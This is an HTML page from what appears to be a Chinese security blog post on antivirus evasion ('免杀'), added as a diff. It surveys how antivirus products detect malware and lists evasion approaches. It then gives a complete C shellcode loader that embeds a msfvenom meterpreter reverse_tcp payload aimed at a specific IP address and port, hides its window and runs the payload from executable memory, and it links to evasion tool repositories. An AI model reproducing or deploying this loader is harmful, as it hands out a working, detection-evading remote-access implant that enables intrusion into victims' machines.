@@ -1,0 +1,732 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介本文章只是提及概念 基础篇免杀的概念 免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。 – 百度百科  常见的免杀方式 静态">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀">
+<meta property="og:url" content="https://tsy244.github.io/2024/01/29/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介本文章只是提及概念 基础篇免杀的概念 免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。 – 百度百科  常见的免杀方式 静态">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/image-20240129234311368.png">
+<meta property="article:published_time" content="2024-01-29T12:42:36.000Z">
+<meta property="article:modified_time" content="2024-01-29T16:03:20.910Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/image-20240129234311368.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>免杀 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="免杀"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-29 20:42" pubdate>
+          January 29, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">免杀</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章只是提及概念</p>
+<h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="免杀的概念"><a href="#免杀的概念" class="headerlink" title="免杀的概念"></a>免杀的概念</h2><blockquote>
+<p>免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。 – 百度百科</p>
+</blockquote>
+<h2 id="常见的免杀方式"><a href="#常见的免杀方式" class="headerlink" title="常见的免杀方式"></a>常见的免杀方式</h2><ul>
+<li>静态查杀：对文件进行特征匹配的思路  </li>
+<li>云查杀：对文件内容及行为的检测 </li>
+<li>动态查杀：对其产生的行为进行检测</li>
+</ul>
+<h2 id="杀软检测技术介绍"><a href="#杀软检测技术介绍" class="headerlink" title="杀软检测技术介绍"></a>杀软检测技术介绍</h2><ol>
+<li><p>基于签名的检测</p>
+<p>当恶意软件被杀软公司采集后，杀软后台的研究人员以及动态分析系统便会对这些样本进行分析，一旦确定是恶意软件，后台便会提取恶意文件的标签并将其添加到反病毒软件的签名数据库中</p>
+</li>
+<li><p>静态程序分析</p>
+<p>静态程序分析是在不实际运行程序的情况下进行的分析。大部份的静态程序分析的对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p>
+</li>
+<li><p>动态程序分析</p>
+<p>动态程序分析是通过在真实或虚拟处理器上执行程序而执行的分析。为了使动态程序分析真实可信，  我们必须要能够对各种目标程序的行为进行测试。  </p>
+</li>
+<li><p>沙盒分析技术</p>
+<p>沙盒是一个观察计算机病毒的重要环境，用于为一些来源不可信、具备破坏力或无法判定程序意图的  程序提供试验环境。  </p>
+</li>
+<li><p>启发式分析</p>
+<p>启发式分析是许多计算机防病毒软件使用的一种方法，其被设计用于检测未知的计算机病毒，以及新  的病毒变体。  </p>
+<p>启发式分析是基于专家的分析，利用它可以对已知或未知的恶意软件进行各种维度的风险衡量，其中多标准分析（MCA）是其中的方法之一，不过启发式分析不是统计分析而是基于可用的数据或统计。</p>
+</li>
+<li><p>信息熵检测</p>
+</li>
+</ol>
+<p>   每个恶意软件都可以被描述成数值性质的属性(例如:信息熵)或者抽象性质的属性，信息熵就是通过找到最合适的量度来验证并且对比恶意软件的属性。</p>
+<ol start="7">
+<li><p>其他常见的检测技术</p>
+<ul>
+<li><p>混淆检测</p>
+<p>病毒由两个部分组成：payload 和 混淆部件(obfuscator)</p>
+<p>载荷是用来做坏事的代码，而混淆部件则是病毒用来保护自身免于被查杀的，通常恶意软件开发者都会将其代码进行混淆以降低其代  码的可读性  </p>
+</li>
+<li><p>加壳</p>
+<p>  恶意软件一般都会被压缩加壳，因为加壳会将可执行文件进行压缩打包, 并将压缩数据与解压缩代码组  合成单个可执行文件的一种手段。 当执行被压缩过的可执行文件时，解压缩代码会在执行之前从压缩  数据中重新创建原始代码。所以检测恶意软件是否使用了加壳技术，也是发现的一种重要手段。  </p>
+</li>
+<li><p>加密检测</p>
+<blockquote>
+<p>  恶意软件使用加密对其二进制程序进行加密，以免被逆向分析。加密存在于恶意软件的构建器和存根  中，当恶意软件需要解密时，不会用恶意代码常用的正常方法执行它。为了隐藏进程，恶意软件使用  了一个有名的RunPE的技术，代码会以挂起的方式执行一个干净的进程（比如iexplorer.exe或者  explorer.exe），然后把内存内容修改成恶意代码后再执行。所以检测RunPE的运行，就可以很容易的  检测到恶意软件了。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="常见的免杀方式-1"><a href="#常见的免杀方式-1" class="headerlink" title="常见的免杀方式"></a>常见的免杀方式</h2><ol>
+<li><p>特征码免杀</p>
+</li>
+<li><p>花指令免杀</p>
+</li>
+<li><p>加壳免杀</p>
+</li>
+<li><p>分离免杀</p>
+<p>就是使用sehllcode 和 shellcode loader </p>
+</li>
+<li><p>资源修改</p>
+</li>
+</ol>
+<h2 id="推荐教程"><a href="#推荐教程" class="headerlink" title="推荐教程"></a>推荐教程</h2><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a>  </p>
+</blockquote>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>shellcode 就是生成的16进制机器码，用于完成某一些动作，由于通常会使用者会获取shell所以称之为shellcode</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/image-20240129234311368.png" srcset="/img/loading.gif" lazyload alt="image-20240129234311368"></p>
+<p>就是普通的payload 然后只不过是制定了文件而已</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#pragma comment(linker, &quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //隐藏控制台窗口（一）</span><br><br><span class="hljs-comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=6666 -f c</span><br><br><span class="hljs-variable">unsigned</span> <span class="hljs-variable">char</span> <span class="hljs-variable">buf</span>[] <span class="hljs-operator">=</span><br>    <span class="hljs-string">&quot;\xfc\xe8\x8f<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x60</span><span class="hljs-char escape_">\x31</span>\xd2<span class="hljs-char escape_">\x89</span>\xe5<span class="hljs-char escape_">\x64</span>\x8b<span class="hljs-char escape_">\x52</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x30</span>\x8b<span class="hljs-char escape_">\x52</span>\x0c\x8b<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x14</span><span class="hljs-char escape_">\x31</span>\xff\x0f\xb7\x4a<span class="hljs-char escape_">\x26</span>\x8b&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x31</span>\xc0\xac\x3c<span class="hljs-char escape_">\x61</span>\x7c<span class="hljs-char escape_">\x02</span>\x2c<span class="hljs-char escape_">\x20</span>\xc1\xcf\x0d&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x01</span>\xc7<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x75</span>\xef<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x57</span>\x8b<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x10</span>\x8b<span class="hljs-char escape_">\x42</span>\x3c<span class="hljs-char escape_">\x01</span>&quot;</span><br>    <span class="hljs-string">&quot;\xd0\x8b<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x78</span><span class="hljs-char escape_">\x85</span>\xc0<span class="hljs-char escape_">\x74</span>\x4c<span class="hljs-char escape_">\x01</span>\xd0\x8b<span class="hljs-char escape_">\x48</span><span class="hljs-char escape_">\x18</span>\x8b&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x01</span>\xd3<span class="hljs-char escape_">\x85</span>\xc9<span class="hljs-char escape_">\x74</span>\x3c<span class="hljs-char escape_">\x49</span>\x8b<span class="hljs-char escape_">\x34</span>\x8b<span class="hljs-char escape_">\x01</span>&quot;</span><br>    <span class="hljs-string">&quot;\xd6<span class="hljs-char escape_">\x31</span>\xff<span class="hljs-char escape_">\x31</span>\xc0\xac\xc1\xcf\x0d<span class="hljs-char escape_">\x01</span>\xc7<span class="hljs-char escape_">\x38</span>\xe0<span class="hljs-char escape_">\x75</span>&quot;</span><br>    <span class="hljs-string">&quot;\xf4<span class="hljs-char escape_">\x03</span>\x7d\xf8\x3b\x7d<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x75</span>\xe0<span class="hljs-char escape_">\x58</span>\x8b<span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x01</span>&quot;</span><br>    <span class="hljs-string">&quot;\xd3<span class="hljs-char escape_">\x66</span>\x8b\x0c\x4b\x8b<span class="hljs-char escape_">\x58</span>\x1c<span class="hljs-char escape_">\x01</span>\xd3\x8b<span class="hljs-char escape_">\x04</span>\x8b<span class="hljs-char escape_">\x01</span>&quot;</span><br>    <span class="hljs-string">&quot;\xd0<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x44</span><span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x24</span>\x5b\x5b<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x59</span>\x5a<span class="hljs-char escape_">\x51</span>\xff\xe0<span class="hljs-char escape_">\x58</span>&quot;</span><br>    <span class="hljs-string">&quot;\x5f\x5a\x8b<span class="hljs-char escape_">\x12</span>\xe9<span class="hljs-char escape_">\x80</span>\xff\xff\xff\x5d<span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x33</span><span class="hljs-char escape_">\x32</span><span class="hljs-char escape_">\x00</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x77</span><span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x32</span>\x5f<span class="hljs-char escape_">\x54</span><span class="hljs-char escape_">\x68</span>\x4c<span class="hljs-char escape_">\x77</span><span class="hljs-char escape_">\x26</span><span class="hljs-char escape_">\x07</span><span class="hljs-char escape_">\x89</span>\xe8&quot;</span><br>    <span class="hljs-string">&quot;\xff\xd0\xb8<span class="hljs-char escape_">\x90</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x29</span>\xc4<span class="hljs-char escape_">\x54</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x29</span><span class="hljs-char escape_">\x80</span>&quot;</span><br>    <span class="hljs-string">&quot;\x6b<span class="hljs-char escape_">\x00</span>\xff\xd5\x6a\x0a<span class="hljs-char escape_">\x68</span>\xc0\xa8\x4f\x8a<span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x00</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x26</span>\xe3<span class="hljs-char escape_">\x89</span>\xe6<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>\xea&quot;</span><br>    <span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5<span class="hljs-char escape_">\x97</span>\x6a<span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x99</span>\xa5<span class="hljs-char escape_">\x74</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x61</span>\xff\xd5<span class="hljs-char escape_">\x85</span>\xc0<span class="hljs-char escape_">\x74</span>\x0a\xff\x4e<span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x75</span>\xec\xe8<span class="hljs-char escape_">\x67</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x6a<span class="hljs-char escape_">\x00</span>\x6a<span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x02</span>\xd9\xc8\x5f&quot;</span><br>    <span class="hljs-string">&quot;\xff\xd5<span class="hljs-char escape_">\x83</span>\xf8<span class="hljs-char escape_">\x00</span>\x7e<span class="hljs-char escape_">\x36</span>\x8b<span class="hljs-char escape_">\x36</span>\x6a<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x10</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x56</span>\x6a<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x58</span>\xa4<span class="hljs-char escape_">\x53</span>\xe5\xff\xd5<span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x53</span>&quot;</span><br>    <span class="hljs-string">&quot;\x6a<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x53</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x02</span>\xd9\xc8\x5f\xff\xd5<span class="hljs-char escape_">\x83</span>\xf8&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span>\x7d<span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x6a<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>\x0b&quot;</span><br>    <span class="hljs-string">&quot;\x2f\x0f<span class="hljs-char escape_">\x30</span>\xff\xd5<span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x75</span>\x6e\x4d<span class="hljs-char escape_">\x61</span>\xff\xd5\x5e&quot;</span><br>    <span class="hljs-string">&quot;\x5e\xff\x0c<span class="hljs-char escape_">\x24</span>\x0f<span class="hljs-char escape_">\x85</span><span class="hljs-char escape_">\x70</span>\xff\xff\xff\xe9\x9b\xff\xff&quot;</span><br>    <span class="hljs-string">&quot;\xff<span class="hljs-char escape_">\x01</span>\xc3<span class="hljs-char escape_">\x29</span>\xc6<span class="hljs-char escape_">\x75</span>\xc1\xc3\xbb\xf0\xb5\xa2<span class="hljs-char escape_">\x56</span>\x6a&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x53</span>\xff\xd5&quot;</span>;<br><br>int <span class="hljs-title function_">main</span>()<br>&#123;<br>    <span class="hljs-comment">//    void* Memory; //等价于PVOID，无类型指针</span><br>    <span class="hljs-variable">PVOID</span> <span class="hljs-title class_">Memory</span> <span class="hljs-operator">=</span> <span class="hljs-variable">NULL</span>; <span class="hljs-comment">// P表示指针，PVOID表示 void * 无类型指针</span><br>    <span class="hljs-title class_">Memory</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">VirtualAlloc</span>(<span class="hljs-variable">NULL</span>, <span class="hljs-title function_">sizeof</span>(<span class="hljs-variable">buf</span>), <span class="hljs-variable">MEM_COMMIT</span> <span class="hljs-operator">|</span> <span class="hljs-variable">MEM_RESERVE</span>, <span class="hljs-variable">PAGE_EXECUTE_READWRITE</span>);<br>    <span class="hljs-comment">//    ShowWindow(GetConsoleWindow(), SW_HIDE);  //隐藏控制台窗口（二）</span><br>    <span class="hljs-title function_">memcpy</span>(<span class="hljs-title class_">Memory</span>, <span class="hljs-variable">buf</span>, <span class="hljs-title function_">sizeof</span>(<span class="hljs-variable">buf</span>));<br>    ((<span class="hljs-title function_">void</span> (<span class="hljs-operator">*</span>)())<span class="hljs-title class_">Memory</span>)();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="常见的工具"><a href="#常见的工具" class="headerlink" title="常见的工具"></a>常见的工具</h1><blockquote>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/Anyyy111/killEscaper">Anyyy111&#x2F;killEscaper: Shellcode 免杀生成器 绕过火绒、360（Windows版本） (github.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/SaadAhla/D1rkLdr">SaadAhla&#x2F;D1rkLdr: Shellcode Loader with Indirect Dynamic syscall Implementation , shellcode in MAC format, API resolving from PEB, Syscall calll and syscall instruction address resolving at run time (github.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/1y0n/AV_Evasion_Tool">1y0n&#x2F;AV_Evasion_Tool: 掩日 - 免杀执行器生成工具 (github.com)</a></li>
+</ol>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>免杀</div>
+      <div>https://tsy244.github.io/2024/01/29/渗透/免杀/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 29, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/27/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun02/" title="RedSun02">
+                        <span class="hidden-mobile">RedSun02</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
